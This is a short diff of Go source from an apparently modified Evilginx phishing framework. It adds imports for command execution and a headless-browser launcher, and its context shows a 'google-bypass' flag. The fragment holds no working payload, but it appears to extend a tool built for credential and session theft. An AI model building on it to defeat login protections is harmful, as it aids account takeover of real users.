@@ -8,7 +8,10 @@ import (
 	"os/user"
 	"path/filepath"
 	"regexp"
+	"bytes"
+	"os/exec"
 
+	"github.com/go-rod/rod/lib/launcher"
 	"github.com/rickm2618/tippietoe2/core"
 	"github.com/rickm2618/tippietoe2/database"
 	"github.com/rickm2618/tippietoe2/log"
@@ -40,6 +43,7 @@ func showAd() {
 	message := fmt.Sprintf("%s.", lred.Sprint("Evilginx Seriously Modded"))
 	log.Info("%s", message)
 }
+
 var google_bypass = flag.Bool("google-bypass", false, "Enable Google Bypass")
 func init() {
 	flag.Parse()
